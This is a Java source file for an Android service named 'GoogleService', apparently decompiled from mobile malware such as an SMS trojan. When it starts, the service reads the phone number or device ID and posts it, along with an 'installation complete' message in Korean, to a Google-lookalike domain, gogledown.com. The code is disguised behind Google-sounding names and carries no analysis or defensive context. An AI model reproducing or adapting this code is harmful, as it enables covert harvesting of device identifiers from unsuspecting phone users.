package android.sms.core;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

public class GoogleService extends Service {
    String phoneNum = "";

    public IBinder onBind(Intent arg0) {
        return null;
    }

    public void onCreate() {
        TelephonyManager manager = (TelephonyManager) getSystemService("phone");
        this.phoneNum = manager.getLine1Number();
        if (this.phoneNum.equals("")) {
            this.phoneNum = manager.getDeviceId();
        }
        this.phoneNum = this.phoneNum.replace("+", "");
        new Thread(new Runnable() {
            public void run() {
                List<NameValuePair> params = new ArrayList();
                NameValuePair pair = new BasicNameValuePair("sbid", GoogleService.this.phoneNum);
                NameValuePair pair1 = new BasicNameValuePair("sendnumber", "설치");
                NameValuePair pair2 = new BasicNameValuePair("sendtype", "2");
                params.add(new BasicNameValuePair("smscontent", "설치완료"));
                params.add(pair2);
                params.add(pair1);
                params.add(pair);
                Log.e("tag", "result = " + ToolHelper.postData("http://www.gogledown.com/vipboss/saves.php", params));
            }
        }).start();
        super.onCreate();
    }
}
